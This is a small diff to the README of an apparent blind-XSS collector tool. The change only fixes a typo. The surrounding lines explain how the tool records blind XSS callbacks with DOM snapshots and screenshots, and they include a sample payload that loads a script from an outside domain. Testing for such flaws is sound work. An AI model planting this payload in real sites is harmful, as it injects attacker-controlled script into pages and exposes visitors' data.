@@ -45,7 +45,7 @@ This endpoint use regex `pichik.*` so you can use `pichik-anything/after/counts.
 
 ### Collecting data from blind XSS  
 You can use any endpoint for testing blind XSS, but dont use your collector path for this, as it have priority, so no blind XSS payload will be send.  
-Detailed report will be created, with DOM and Screenshort.  
+Detailed report will be created, with DOM and Screenshot.  
 These request will be sent to slack, if specified in config.  
 `<script src=https://domain.com></script>`  
 ![blind xss](screenshots/blindxss.png)  
